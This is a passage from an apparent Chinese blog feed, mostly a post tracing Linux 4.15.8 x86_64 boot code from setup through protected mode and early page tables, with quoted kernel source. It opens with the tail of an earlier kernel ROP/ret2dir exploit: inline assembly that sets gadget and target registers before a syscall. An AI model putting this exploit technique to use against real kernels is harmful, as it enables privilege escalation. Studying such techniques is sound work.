r11,   0x66666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    pop_rsp_ret;&quot;</span><br>        <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>ROP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>rop</tag>
      
      <tag>ret2dir</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel源码分析-系统启动（一）</title>
    <link href="/2023/08/08/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2023/08/08/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>前几天沉迷调试SeaBIOS无法自拔，调了两天终于跟踪完了BIOS和boot loader的过程进入内核启动阶段了，之后再整理一下可能会写一下SeaBIOS和boot loader的源码分析和调试（立一个flag）</p><p>之所以调试SeaBIOS是因为想从头开始调试内核但找不到入口，然后支线任务做着做着就偏离主线了(ˉ▽ˉ；)…，现在终于回归主线了</p><p>ps：主要关注内存相关的部分，页表和段之类的</p><span id="more"></span><p>内核版本4.15.8，x86_64</p><h1 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h1><p>kernel加载到了物理地址0x10000，源码可以看出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#arch\x86\boot\header.S<br><br>BOOTSEG= 0x07C0/* original address of boot-sector */<br>SYSSEG= 0x1000/* historical load address &gt;&gt; 4 */<br></code></pre></td></tr></table></figure><p>或者gdb调试也可以看出来，此时cs寄存器的值为0x1020</p><p>进入内核的第一条指令是一个跳转至start_of_setup，地址为0x10268</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#arch\x86\boot\header.S<br><br># offset 512, entry point<br><br>.globl_start<br>_start:<br># Explicitly enter this as bytes, or the assembler<br># tries to generate a 3-byte jump here, which causes<br># everything else to push off to the wrong offset.<br>.byte0xeb# short (2-byte) jump<br>.bytestart_of_setup-1f<br></code></pre></td></tr></table></figure><p>start_of_setup的主要作用有</p><ul><li>保证所有段寄存器值相等</li><li>建立栈</li><li>建立bss段</li><li>跳转至main函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#arch\x86\boot\header.S<br><br>.section &quot;.entrytext&quot;, &quot;ax&quot;<br>start_of_setup:<br># 使ds和es相等<br>movw%ds, %ax<br>movw%ax, %es<br>cld<br><br># 建立栈：判断ss是否等于ds，如果等于则说明栈已建立<br><br>movw%ss, %dx<br>cmpw%ax, %dx# %ds == %ss?<br>movw%sp, %dx<br>je2f# -&gt; assume %sp is reasonably set<br><br># ss不等于ds，栈不合法，建立新栈<br># 如果使用堆，则在堆地址结束处建立栈，否则在_end处建立栈<br>movw$_end, %dx<br>testb$CAN_USE_HEAP, loadflags<br>jz1f<br>movwheap_end_ptr, %dx<br>1:addw$STACK_SIZE, %dx<br>jnc2f<br>xorw%dx, %dx<br><br>2:# 此时dx指向栈顶<br>andw$~3, %dx# 对齐判断<br>jnz3f<br>movw$0xfffc, %dx# 确保dx不为零<br>3:movw%ax, %ss# 栈基址和数据段基址相同<br>movzwl%dx, %esp<br>sti# 栈建立完毕<br><br># 同步cs和其他段寄存器，此时cs为0x1020，其他段寄存器为0x1000<br>pushw%ds<br>pushw$6f<br>lretw# lretw将6的地址放入rip，将ds寄存器的值放入cs寄存器，cs寄存器同步0x1000<br>6:<br><br># 检查签名<br>cmpl$0x5a5aaa55, setup_sig<br>jnesetup_bad<br><br># 清空bss段<br>movw$__bss_start, %di<br>movw$_end+3, %cx<br>xorl%eax, %eax<br>subw%di, %cx<br>shrw$2, %cx<br>rep; stosl<br><br># 跳转至main函数<br>calllmain<br><br># Setup corrupt somehow...<br>setup_bad:<br>movl$setup_corrupt, %eax<br>calllputs<br># Fall through...<br><br>.globldie<br>.typedie, @function<br>die:<br>hlt<br>jmpdie<br><br>.sizedie, .-die<br><br>.section &quot;.initdata&quot;, &quot;a&quot;<br>setup_corrupt:<br>.byte7<br>.string&quot;No setup signature found...\n&quot;<br></code></pre></td></tr></table></figure><p>这段代码结束后</p><ul><li>sp：0xfff0</li><li>__bss_start：0x13c00</li><li>_end：0x14f10</li></ul><h1 id="main"><a href="#main" class="headerlink" title="main"></a>main</h1><p>main函数的主要功能为</p><ul><li>初始化console、heap</li><li>检测内存、CPU验证、键盘初始化</li><li>进入保护模式</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//arch\x86\boot\main.c</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* 将boot header复制到zeropage中 */</span><br>copy_boot_params();<br><br><span class="hljs-comment">/* 初始化早期启动状态下的控制台 */</span><br>console_init();<br><span class="hljs-keyword">if</span> (cmdline_find_option_bool(<span class="hljs-string">&quot;debug&quot;</span>))<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;early console in setup code\n&quot;</span>);<br><br><span class="hljs-comment">/* 初始化堆 */</span><br>init_heap();<br><br><span class="hljs-comment">/* 检测 CPU 相关信息 */</span><br><span class="hljs-keyword">if</span> (validate_cpu()) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Unable to boot - please use a kernel appropriate &quot;</span><br>     <span class="hljs-string">&quot;for your CPU.\n&quot;</span>);<br>die();<br>&#125;<br><br><span class="hljs-comment">/* 通过向 BIOS 查询的方式，收集硬件相关信息，并将结果存放在zeropage中 */</span><br>set_bios_mode();<br><br><span class="hljs-comment">/* 从BIOS处收集内存信息，包括内存段起始、内存段大小、内存段类型等 */</span><br>detect_memory();<br><br><span class="hljs-comment">/* 初始化键盘 */</span><br>keyboard_init();<br><br><span class="hljs-comment">/* 询问IST */</span><br>query_ist();<br><br><span class="hljs-comment">/* 询问APM */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_APM) || defined(CONFIG_APM_MODULE)</span><br>query_apm_bios();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* 询问EDD */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_EDD) || defined(CONFIG_EDD_MODULE)</span><br>query_edd();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* 设置显示模式 */</span><br>set_video();<br><br><span class="hljs-comment">/* 切换保护模式 */</span><br>go_to_protected_mode();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="copy-boot-params"><a href="#copy-boot-params" class="headerlink" title="copy_boot_params"></a>copy_boot_params</h2><p>copy_boot_params主要完成：</p><ul><li>将hdr的内容复制给boot_params：0x13ef0</li><li>如果使用的是旧的command line则将其复制到0x9000</li><li>更新boot_params.cmd_line_ptr</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">copy_boot_params</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">old_cmdline</span> &#123;</span><br>u16 cl_magic;<br>u16 cl_offset;<br>&#125;;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">old_cmdline</span> * <span class="hljs-title">const</span> <span class="hljs-title">oldcmd</span> =</span><br>(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> old_cmdline *)OLD_CL_ADDRESS;<br><br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span> boot_params != <span class="hljs-number">4096</span>);<br><span class="hljs-built_in">memcpy</span>(&amp;boot_params.hdr, &amp;hdr, <span class="hljs-keyword">sizeof</span> hdr);<br><br><span class="hljs-keyword">if</span> (!boot_params.hdr.cmd_line_ptr &amp;&amp;<br>    oldcmd-&gt;cl_magic == OLD_CL_MAGIC) &#123;<br><span class="hljs-comment">/* Old-style command line protocol. */</span><br>u16 cmdline_seg;<br><br><span class="hljs-comment">/* Figure out if the command line falls in the region</span><br><span class="hljs-comment">   of memory that an old kernel would have copied up</span><br><span class="hljs-comment">   to 0x90000... */</span><br><span class="hljs-keyword">if</span> (oldcmd-&gt;cl_offset &lt; boot_params.hdr.setup_move_size)<br>cmdline_seg = ds();<br><span class="hljs-keyword">else</span><br>cmdline_seg = <span class="hljs-number">0x9000</span>;<br><br>boot_params.hdr.cmd_line_ptr =<br>(cmdline_seg &lt;&lt; <span class="hljs-number">4</span>) + oldcmd-&gt;cl_offset;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong>ps：</strong></em></p><ul><li><p><em>hdr的地址为0x1f1，hdr和boot_params的地址都可以通过调试得到（定位内存复制的命令）</em></p></li><li><p><em>hdr结构定义在header.S文件中</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globlhdr<br>hdr:<br>setup_sects:.byte 0/* Filled in by build.c */<br>root_flags:.word ROOT_RDONLY<br>syssize:.long 0/* Filled in by build.c */<br>ram_size:.word 0/* Obsolete */<br>vid_mode:.word SVGA_MODE<br>root_dev:.word 0/* Filled in by build.c */<br>boot_flag:.word 0xAA55<br></code></pre></td></tr></table></figure><p><em><strong>md这破玩意我纠结了一下午</strong></em></p></li></ul><h2 id="init-heap"><a href="#init-heap" class="headerlink" title="init_heap"></a>init_heap</h2><p>调试看boot_params结构体可以看出heap_end:0xfe00</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">init_heap</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">char</span> *stack_end;<br><br><span class="hljs-keyword">if</span> (boot_params.hdr.loadflags &amp; CAN_USE_HEAP) &#123;<br><span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;leal %P1(%%esp),%0&quot;</span><br>    : <span class="hljs-string">&quot;=r&quot;</span> (stack_end) : <span class="hljs-string">&quot;i&quot;</span> (-STACK_SIZE));<br><br>heap_end = (<span class="hljs-type">char</span> *)<br>((<span class="hljs-type">size_t</span>)boot_params.hdr.heap_end_ptr + <span class="hljs-number">0x200</span>);<br><span class="hljs-keyword">if</span> (heap_end &gt; stack_end)<br>heap_end = stack_end;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Boot protocol 2.00 only, no heap available */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;WARNING: Ancient bootloader, some functionality &quot;</span><br>     <span class="hljs-string">&quot;may be limited!\n&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="go-to-protected-mode"><a href="#go-to-protected-mode" class="headerlink" title="go_to_protected_mode"></a>go_to_protected_mode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">go_to_protected_mode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* 禁止中断 */</span><br>realmode_switch_hook();<br><br><span class="hljs-comment">/* 启动A20 */</span><br><span class="hljs-keyword">if</span> (enable_a20()) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;A20 gate not responding, unable to boot...\n&quot;</span>);<br>die();<br>&#125;<br><br>reset_coprocessor();<br><br><span class="hljs-comment">/* 配置中断 */</span><br>mask_all_interrupts();<br><br><span class="hljs-comment">/* 配置idt和gdt表，转换至保护模式 */</span><br>setup_idt();<br>setup_gdt();<br>protected_mode_jump(boot_params.hdr.code32_start,<br>    (u32)&amp;boot_params + (ds() &lt;&lt; <span class="hljs-number">4</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>gdt基址都为0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setup_gdt</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* There are machines which are known to not boot with the GDT</span><br><span class="hljs-comment">   being 8-byte unaligned.  Intel recommends 16 byte alignment. */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> u64 boot_gdt[] __attribute__((aligned(<span class="hljs-number">16</span>))) = &#123;<br><span class="hljs-comment">/* CS: code, read/execute, 4 GB, base 0 */</span><br>[GDT_ENTRY_BOOT_CS] = GDT_ENTRY(<span class="hljs-number">0xc09b</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xfffff</span>),<br><span class="hljs-comment">/* DS: data, read/write, 4 GB, base 0 */</span><br>[GDT_ENTRY_BOOT_DS] = GDT_ENTRY(<span class="hljs-number">0xc093</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xfffff</span>),<br><span class="hljs-comment">/* TSS: 32-bit tss, 104 bytes, base 4096 */</span><br><span class="hljs-comment">/* We only have a TSS here to keep Intel VT happy;</span><br><span class="hljs-comment">   we don&#x27;t actually use it for anything. */</span><br>[GDT_ENTRY_BOOT_TSS] = GDT_ENTRY(<span class="hljs-number">0x0089</span>, <span class="hljs-number">4096</span>, <span class="hljs-number">103</span>),<br>&#125;;<br><span class="hljs-comment">/* Xen HVM incorrectly stores a pointer to the gdt_ptr, instead</span><br><span class="hljs-comment">   of the gdt_ptr contents.  Thus, make it static so it will</span><br><span class="hljs-comment">   stay in memory, at least long enough that we switch to the</span><br><span class="hljs-comment">   proper kernel GDT. */</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gdt_ptr</span> <span class="hljs-title">gdt</span>;</span><br><br>gdt.len = <span class="hljs-keyword">sizeof</span>(boot_gdt)<span class="hljs-number">-1</span>;<br>gdt.ptr = (u32)&amp;boot_gdt + (ds() &lt;&lt; <span class="hljs-number">4</span>);<br><br><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;lgdtl %0&quot;</span> : : <span class="hljs-string">&quot;m&quot;</span> (gdt))</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入保护模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly">GLOBAL(protected_mode_jump)<br>movl%edx, %esi# 指向boot_params<br><br>xorl%ebx, %ebx<br>movw%cs, %bx<br>shll$4, %ebx<br>addl%ebx, 2f<br>jmp1f# Short jump to serialize on 386/486<br>1:<br><br>movw$__BOOT_DS, %cx<br>movw$__BOOT_TSS, %di<br><br>movl%cr0, %edx<br>orb$X86_CR0_PE, %dl# 调整至保护模式（更改cr0）<br>movl%edx, %cr0<br><br># 长跳转进入保护模式<br>.byte0x66, 0xea# ljmpl opcode<br>2:.longin_pm32# offset<br>.word__BOOT_CS# segment<br>ENDPROC(protected_mode_jump)<br><br>.code32<br>.section &quot;.text32&quot;,&quot;ax&quot;<br>GLOBAL(in_pm32)<br># 建立32位的data段<br>movl%ecx, %ds<br>movl%ecx, %es<br>movl%ecx, %fs<br>movl%ecx, %gs<br>movl%ecx, %ss<br># 建立保护模式栈<br>addl%ebx, %esp<br><br># 设置TR以使Intel VT正常工<br>ltr%di<br><br># 清空寄存器<br>xorl%ecx, %ecx<br>xorl%edx, %edx<br>xorl%ebx, %ebx<br>xorl%ebp, %ebp<br>xorl%edi, %edi<br><br># 设置LDTR以使Intel VT正常工作<br>lldt%cx<br><br>jmpl*%eax# Jump to the 32-bit entrypoint<br>ENDPROC(in_pm32)<br></code></pre></td></tr></table></figure><p>之后函数流程跳转到0x100000:startup_32</p><h1 id="startup-32"><a href="#startup-32" class="headerlink" title="startup_32"></a>startup_32</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ENTRY(startup_32)<br><br>cld<br>testb $KEEP_SEGMENTS, BP_loadflags(%esi)<br>jnz 1f<br><br>cli<br>movl$(__BOOT_DS), %eax<br>movl%eax, %ds<br>movl%eax, %es<br>movl%eax, %ss<br>1:<br><br>/*<br> * 长模式支持rip相对寻址但保护模式不支持，所以需要计算编译地址和实际运行地址偏差（编译地址为0）<br> * 此时esi中是boot_params的地址，之前已经填充过了<br> * boot_params.hdr中包含一个成员scratch（偏移量为0x1e4）<br> */<br>leal(BP_scratch+4)(%esi), %esp# scratch空间成为call指令的临时栈（+4是因为栈从上往下增长）<br>call1f# esp的值存入栈顶ebp，1的地址（返回地址）被入栈（scratch）<br>1:popl%ebp# 1的地址存入ebp<br>subl$1b, %ebp#计算差值<br><br>/* 建立栈并确保cpu支持64位 */<br>movl$boot_stack_end, %eax<br>addl%ebp, %eax<br>movl%eax, %esp<br><br>callverify_cpu<br>testl%eax, %eax<br>jnzno_longmode<br><br>/*<br> * 计算内核解压地址<br> */<br><br>#ifdef CONFIG_RELOCATABLE<br>movl%ebp, %ebx# 将startup_32基址放入ebx<br>movlBP_kernel_alignment(%esi), %eax# 将boot_params.hdr-&gt;kernel_alignment放入eax<br>decl%eax# eax--<br>addl%eax, %ebx# ebx+=eax<br>notl%eax# eax=~eax<br>andl%eax, %ebx# ebx~=eax<br>cmpl$LOAD_PHYSICAL_ADDR, %ebx# 以上步骤就是为了对齐<br>jge1f<br>#endif<br>movl$LOAD_PHYSICAL_ADDR, %ebx<br>1:<br><br>/* 重定位地址准备解压 */<br>movlBP_init_size(%esi), %eax# eax=boot_params.hdr-&gt;init_size<br>subl$_end, %eax# eax-=_end<br>addl%eax, %ebx# ebx+=eax（重定位物理地址）<br><br>/*<br> * 准备进入64位模式<br> */<br><br>/* 更新gdt */<br>addl%ebp, gdt+2(%ebp)<br>lgdtgdt(%ebp)<br><br>/* 开启PAE */<br>movl%cr4, %eax<br>orl$X86_CR4_PAE, %eax<br>movl%eax, %cr4<br><br> /*<br>  * 建立映射4G内存的页表<br>  */<br>/*<br> * 页表加密（？）<br> */<br>callget_sev_encryption_bit<br>xorl%edx, %edx<br>testl%eax, %eax<br>jz1f<br>subl$32, %eax/* Encryption bit is always above bit 31 */<br>bts%eax, %edx/* Set encryption mask for page tables */<br>1:<br><br>/* 清空页表:0x2bec000-0x2bf2000 */<br>lealpgtable(%ebx), %edi<br>xorl%eax, %eax<br>movl$(BOOT_INIT_PGT_SIZE/4), %ecx<br>repstosl<br><br>/* Build Level 4 */<br>lealpgtable + 0(%ebx), %edi<br>leal0x1007 (%edi), %eax<br>movl%eax, 0(%edi)<br>addl%edx, 4(%edi)<br><br>/* Build Level 3 */<br>lealpgtable + 0x1000(%ebx), %edi<br>leal0x1007(%edi), %eax<br>movl$4, %ecx<br>1:movl%eax, 0x00(%edi)<br>addl%edx, 0x04(%edi)<br>addl$0x00001000, %eax<br>addl$8, 